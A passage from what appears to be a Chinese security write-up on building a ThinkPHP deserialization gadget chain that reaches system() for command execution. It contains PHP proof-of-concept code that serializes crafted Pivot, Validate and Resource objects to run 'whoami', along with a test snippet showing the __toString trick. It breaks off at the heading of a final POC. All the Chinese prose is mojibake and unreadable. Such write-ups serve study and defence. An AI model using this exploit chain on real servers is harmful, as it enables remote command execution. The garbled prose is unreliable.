</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">appendAttrToArray</span><span class="p">(</span><span class="nv">$item</span><span class="p">,</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$visible</span><span class="p">,</span> <span class="nv">$hidden</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">..............</span><span class="nx">ç­‰ä»£ç </span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">       
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œä¸»è¦ä¸»è¦å°±æ˜¯è¦è°ƒç”¨æœ€åçš„appendAttrToArray()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061716303.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306171611230"
	
	
></p>
<p>ç„¶åè°ƒç”¨è¿™é‡Œçš„getRelationWith()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061716162.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306171651095"
	
	
></p>
<p>è¿™é‡Œå°±å¯ä»¥è§¦å‘<code>__call()</code>æ–¹æ³•ï¼Œå¯¹äºå‚æ•°çš„ä¼ é€’ï¼Œå…¶å®ä¸éš¾ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç‚¹æ²¡æƒ³æ˜ç™½ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061723540.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306172323463"
	
	
></p>
<p>è¿™é‡Œçš„ruleä¼šæ˜¯ä»€ä¹ˆï¼Ÿé—®æˆ‘ä¼ å‚æ—¶å¹¶æ²¡æœ‰ä¼ è¿™ä¸ªå‚æ•°ï¼Œå…ˆç®€å•æ„é€ çœ‹çœ‹è¿™é‡Œçš„å‚æ•°æ˜¯ä»€ä¹ˆã€‚</p>
<h5 id="expæ„é€ ">expæ„é€ 
</h5><h6 id="é—®é¢˜è¯´æ˜">é—®é¢˜è¯´æ˜
</h6><p>è¿™é‡Œçš„å‚æ•°è¯´æ˜å°±ä¸å…·ä½“è¯´æ˜äº†ï¼Œç›´æ¥æ„é€ å³å¯ï¼Œå®åœ¨æƒ³ä¸å‡ºçš„æ—¶å€™å¯ä»¥å†çœ‹çœ‹Pæˆ‘æ„é€ å‡ºæ¥çš„POCï¼Œè¿™é‡Œæœ‰å‡ ä¸ªç‚¹éœ€è¦è¯´æ˜ä¸€ä¸‹ï¼š</p>
<p><strong>1.</strong></p>
<p>åœ¨å‰é¢çš„é“¾å­æ‰¾å¯»è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥çŸ¥é“é“¾å­å…¶ä¸­ä¸€ä¸ªæ˜¯traitç±»å‹çš„Conversionç±»ï¼Œæ˜¯ä»£ç å¤ç”¨ç±»å‹çš„ï¼Œä¸èƒ½ç›´æ¥å®ä¾‹åŒ–æ¥ä½¿ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦åˆ©ç”¨åˆ°ä»–çš„<code>__toString()</code>æ–¹æ³•ï¼Œæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Œè‡ªå·±æ„é€ çš„æ—¶å€™ä¹Ÿæ˜¯åœ¨Conversionç±»ä¸­æœ‰ä¸€ä¸ªå‘ä¸‹æ‰¾çš„æŒ‰é’®ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061802638.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306180236572"
	
	
></p>
<p>å¾€ä¸‹è·³ï¼Œåˆ°äº†ModelæŠ½è±¡ç±»:</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061806122.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306180629060"
	
	
></p>
<p>å†å¾€ä¸‹å°±åˆ°äº†Pivotç±»ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061806263.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306180654204"
	
	
></p>
<p>è¿™ä¸ªç±»å°±æ˜¯å¯ä»¥ç›´æ¥å®ä¾‹åŒ–æ¥ä½¿ç”¨çš„ï¼Œæ‰€ä»¥æœ€åæˆ‘ä»¬è¦ä½¿ç”¨çš„ç±»å°±æ˜¯è¿™ä¸ªç±»ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”</p>
<p><strong>2.</strong></p>
<p>è¿˜æœ‰ä¸ªå°±æ˜¯å‰é¢é—ç•™çš„<code>$rule</code>å‚æ•°é—®é¢˜ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062204633.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306220415567"
	
	
></p>
<p>æœç„¶è¿˜æ˜¯è°ƒè¯•ä¸€ä¸‹å°±çŸ¥é“äº†ï¼Œè¿™é‡Œçš„<code>$rule</code>å˜é‡çš„å€¼æ˜¯<code>visible</code>ï¼Œåé¢ç®€å•è¯´è¯´æ˜¯æ€ä¹ˆè¿›è¡Œçš„ï¼š</p>
<p>åœ¨<code>__call</code>æ–¹æ³•ä¸­ï¼Œè§¦å‘çš„ç‚¹æ˜¯visible()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062206931.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306220625866"
	
	
></p>
<p>æ‰€ä»¥å¦‚ä¸‹<code>__call</code>æºç ï¼Œè¿™é‡Œä¼šç›´æ¥å°†è¿™ä¸ª<code>$method</code>çš„å€¼ç›´æ¥pushä¸Šæ•°ç»„ä¸­ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062207361.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306220759296"
	
	
></p>
<p>è®©ç„¶ååœ¨è°ƒç”¨is()å‡½æ•°æ—¶ï¼Œå¯¹äº<code>$value</code>å’Œ<code>$rule</code>çš„å€¼ï¼Œå°±æ˜¯æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼å’Œç¬¬äºŒä¸ªå€¼ã€‚</p>
<p><strong>3.</strong></p>
<p>æœ€é‡è¦çš„ä¸€ç‚¹ï¼Œniviaå¸ˆå‚…tqlï¼Œä¹Ÿæ˜¯æˆ‘å¡ä½çš„ä¸€ç‚¹ï¼Œå¯¼è‡´è¿™ä¸€æ­¥æ²¡æ„é€ å‡ºPOCï¼Œç®€å•è´´ä¸€ä¸‹æˆ‘çš„åŸæœ¬<strong>é”™è¯¯çš„</strong>POCï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Validate</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$type</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;visible&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;system&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Route</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pivot</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$visible</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$hidden</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$append</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$relation</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;fupanc.whoami&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;113&#39;</span><span class="o">=&gt;</span><span class="k">true</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;fupanc.111111&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\Validate</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Resource</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rule</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$option</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rest</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$router</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rule</span><span class="o">=</span><span class="s2">&#34;fupanc&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">router</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\Route</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;var&#34;</span><span class="o">=&gt;</span><span class="p">[</span><span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\model\Pivot</span><span class="p">()],</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rest</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s2">&#34;111&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;id&gt;&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="s2">&#34;f&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ResourceRegister</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$registered</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$resource</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registered</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="s2">&#34;f&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\Resource</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\ResourceRegister</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥åŠ¨æ€ç”Ÿæˆè°ƒè¯•ä¸€ä¸‹ã€‚</p>
<p>å°±ç®€å•è¯´è¯´è¿™é‡Œçš„å·®é”™ç‚¹ï¼š</p>
<p>åŒæ ·çš„ï¼Œæˆ‘ä¹Ÿæ˜¯å…³æ³¨åˆ°äº†åœ¨toArray()æ–¹æ³•ä¸­çš„å¯¹<code>$this-&gt;visible</code>çš„åˆ†å‰²ï¼ŒåŒæ ·çš„æœ€å¼€å§‹æ„é€ æ˜¯æ˜¯æƒ³è¦åˆ©ç”¨elseè¯­å¥ä¸­çš„ä»£ç å—æ¥è¿›è¡Œèµ‹å€¼æ“ä½œï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062216565.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306221632496"
	
	
></p>
<p>ä½†æ˜¯åœ¨å‚æ•°è·Ÿè¿›ä¸­ï¼Œå‘ç°è¿™é‡Œæ˜¯éœ€è¦å°†è¿™ä¸ª<code>$val</code>è®¾ç½®ä¸ºå‘½ä»¤æ‰§è¡Œçš„å‚æ•°ï¼Œæ¯”å¦‚<code>whoami</code>ï¼Œä½†æ˜¯è¿™é‡Œå°±ä¸€å®šä¼šæ˜¯å­—ç¬¦ä¸²ç±»å‹çš„ï¼Œå°±ä¸€å®šä¸èƒ½æˆåŠŸè°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘å‰é¢çš„POCæ„é€ å°±é¡ºåº”è¶‹åŠ¿ï¼Œå°è¯•å¯¹ifä¸­çš„è¯­å¥è¿›è¡Œåˆ©ç”¨ï¼Œæ‰€ä»¥éœ€è¦æœ‰<code>.</code>ï¼Œè®©ç„¶å<code>$name</code>çš„å€¼ä¸ºå‘½ä»¤æ‰§è¡Œå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä¼ å‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;fupanc.whoami&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">];</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·å°±èƒ½å½¢æˆä¸€ä¸ª<code>$visible['fupanc'][] = &quot;whoami&quot;</code>äº†ï¼Œåœ¨æœ€åçš„è°ƒç”¨call()æ–¹æ³•æ—¶ï¼Œè¿™é‡Œçš„å‚æ•°å°±æ˜¯ä¼ é€’çš„è¿™ä¸ªï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062223659.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306222319604"
	
	
></p>
<p>ä½†æ˜¯å‘€ä½†æ˜¯ï¼Œé¡ºåº”ifè¯­å¥çš„åæœæ˜¯ï¼Œé‡Œé¢æ˜¯ä¸€å±‚æ•°ç»„ï¼ˆä¹Ÿå°±æ˜¯ä¼šç”Ÿæˆä¸Šé¢ç»™çš„ç¤ºä¾‹çš„ç»“æœï¼‰ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062224578.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306222429525"
	
	
></p>
<p>æœ¬æ¥æˆ‘è¿˜å¾ˆå…´å¥‹ï¼Œåˆšå¥½<code>call_user_func_array()</code>å‡½æ•°ç¬¬äºŒä¸ªå°±æ˜¯éœ€è¦ä¸€ä¸ªæ•°ç»„ç±»å‹ï¼Œä½†æ˜¯ï¼Œåœ¨çœŸæ­£è°ƒç”¨æ—¶ï¼Œæ˜¯åœ¨å¤–é¢å¥—äº†ä¸€å±‚æ•°ç»„çš„ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062226751.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306222601693"
	
	
></p>
<p>æ‰€ä»¥è¿™é‡ŒçœŸæ­£è°ƒç”¨æ—¶æ˜¯ä¼šæŠ¥é”™çš„ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062227441.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306222722392"
	
	
></p>
<p>æ‰€ä»¥è¿™é‡Œæ˜¯å¤±è´¥çš„ã€‚è¿˜æ˜¯å¿…é¡»è¦è¿›å…¥åˆ°elseä¸­çš„è¯­å¥å‘€ï¼Œè¿™æ ·æ‰èƒ½èµ‹å€¼ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹ï¼Œä»è€Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯ä¸€ç›´æƒ³ä¸é€šå‘€ï¼Œæ€ä¹ˆå¯ä»¥è¿™æ ·è¿›è¡Œå‘¢ï¼Ÿ</p>
<p>æœ€åè¿˜æ˜¯çœ‹çš„niviaå­¦é•¿çš„æ–‡ç« ï¼Œé‡Œé¢æœ‰å¦‚ä¸‹è¯´æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062230405.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306223038346"
	
	
></p>
<p>æˆ‘æœ€å¼€å§‹ä¹Ÿæ˜¯çœ‹ä¸æ‡‚çš„ï¼Œé€šè¿‡çœ‹POCä»¥åŠå†™ä»£ç ï¼Œç»ˆäºç†è§£åˆ°äº†ã€‚</p>
<p>åœ¨è¿™é‡Œniviaå­¦é•¿å°±æ˜¯å°†<code>$val</code>è®¾ç½®ä¸ºäº†ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œç„¶ååœ¨å‡½æ•°è°ƒç”¨æ—¶ä¼šè§¦å‘toString()å‡½æ•°ï¼Œä»è€Œè¾“å‡ºè¿™ä¸ªå†…å®¹ï¼Œä½†æ˜¯ä¹Ÿæ˜¯ä¸€ç›´æ²¡æƒ³æ¸…æ¥šæ˜¯å“ªé‡Œè°ƒç”¨äº†è§¦å‘äº†toString()æ–¹æ³•ï¼Œåé¢æƒ³åˆ°äº†å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œéœ€è¦stringç±»å‹ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½æ˜¯è¿™ä¸ªç‚¹ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Student</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;whoami&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Student</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">call_user_func_array</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">,[</span><span class="nv">$a</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åæˆåŠŸè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚æˆåŠŸï¼Œé‚£ä¹ˆå°±æ˜¯è¿™æ ·è¿›è¡Œçš„ã€‚</p>
<p>å¹¶ä¸”ï¼Œè¿™é‡Œéå¸¸éå¸¸é‡è¦çš„æ˜¯ï¼Œè¿˜åˆšå¥½æœ‰ä¸€ä¸ªç±»çš„toString()å‡½æ•°æ˜¯ç¬¦åˆè¿™ä¸ªæ¡ä»¶çš„ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062236245.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306223605193"
	
	
></p>
<p>toString()å‡½æ•°å†…å®¹å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span><span class="o">:</span> <span class="nx">string</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å“‡å¡ï¼Œå¤ªç¬¦åˆäº†ï¼Œæ€ä¹ˆå°±ä¼šæœ‰è¿™ä¹ˆå·§çš„æƒ…å†µå‡ºç°ï¼Œtqlï¼Œåˆå­¦åˆ°ä¸€ä¸ªæ–°çš„åˆ©ç”¨ç‚¹ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”</p>
<h6 id="æœ€ç»ˆpoc">æœ€ç»ˆPOC
</h6><p>å®Œäº‹å…·å¤‡ï¼Œæœ€åçš„å®Œæ•´POCå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
